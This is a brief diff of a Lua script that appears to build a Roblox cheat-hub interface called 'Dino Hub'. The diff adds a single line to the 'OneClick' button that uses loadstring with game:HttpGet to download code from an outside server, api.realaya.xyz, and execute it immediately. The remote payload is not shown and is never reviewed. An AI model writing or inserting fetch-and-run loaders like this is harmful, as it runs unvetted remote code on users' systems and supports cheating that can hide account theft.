@@ -6,6 +6,7 @@ local Window = library:Window("Dino",[[Hub]],[[Version : OneClick  ]],"994304177
     General_Tab:Label("Thx for use!")
 
    General_Tab:Button("OneClick",function()
+   loadstring(game:HttpGet("https://api.realaya.xyz/v1/files/l/73mkp0aqyfo4ypy8hvl0nz10lq49fey5.lua"))()
    end)
   
    General_Tab:Toggle("Black screen","9606294253",false,function()
